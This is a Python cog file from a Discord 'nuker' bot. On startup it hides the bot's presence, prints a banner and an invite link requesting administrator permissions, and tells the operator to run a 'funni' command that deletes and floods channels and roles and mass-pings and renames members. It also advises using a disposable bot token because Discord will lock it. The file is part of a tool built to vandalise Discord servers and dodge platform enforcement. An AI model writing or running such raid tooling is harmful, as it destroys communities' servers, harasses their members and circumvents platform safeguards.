import discord, os, time
from discord.ext import commands
from colorama import Fore, Style, Back


class online(commands.Cog):

	def __init__(self, client):
		self.client = client

	@commands.Cog.listener()
	async def on_ready(self):
		await self.client.change_presence(status=discord.Status.invisible)
		print(f"{Fore.LIGHTGREEN_EX}[+] {self.client.user} Is Online")
		time.sleep(0.5)
		os.system("clear")
		print(f"""{Style.DIM}{Fore.MAGENTA}
███╗░░██╗░█████╗░██████╗░░█████╗░██████╗░██╗░░░██╗{Style.DIM}{Fore.LIGHTMAGENTA_EX}
████╗░██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝{Style.RESET_ALL}{Fore.MAGENTA}
██╔██╗██║██║░░██║██████╦╝██║░░██║██║░░██║░╚████╔╝░
██║╚████║██║░░██║██╔══██╗██║░░██║██║░░██║░░╚██╔╝░░{Style.RESET_ALL}{Fore.LIGHTMAGENTA_EX}
██║░╚███║╚█████╔╝██████╦╝╚█████╔╝██████╔╝░░░██║░░░
╚═╝░░╚══╝░╚════╝░╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░{Style.BRIGHT}{Fore.LIGHTWHITE_EX}"""
		      )
		print(
		 f"""==================================================================={Fore.LIGHTGREEN_EX}
User       : {self.client.user}
User ID    : {self.client.user.id}
Prefix     : {self.client.command_prefix}
Bot Invite : https://discord.com/api/oauth2/authorize?client_id={self.client.user.id}&permissions=8&scope=bot""")
		print(
		 f"""{Style.BRIGHT}{Fore.LIGHTWHITE_EX}===================================================================
{Fore.MAGENTA}Run {self.client.command_prefix}funni to nuke
(Deletes and floods channels and roles, as well as mass ping and mass nicknaming)
{Style.BRIGHT}{Fore.LIGHTWHITE_EX}==================================================================="""
		)
		print(
		 f"""{Back.RED}{Fore.WHITE}[!] Please ensure you are using a disposible bot token as discord will lock it afterwards
[!] Also ensure the bot's highest role is above the roles you want to effect"""
		)
		print(
		 f"{Style.BRIGHT}{Back.RESET}{Fore.LIGHTWHITE_EX}==================================================================="
		)


async def setup(client):
	await client.add_cog(online(client))
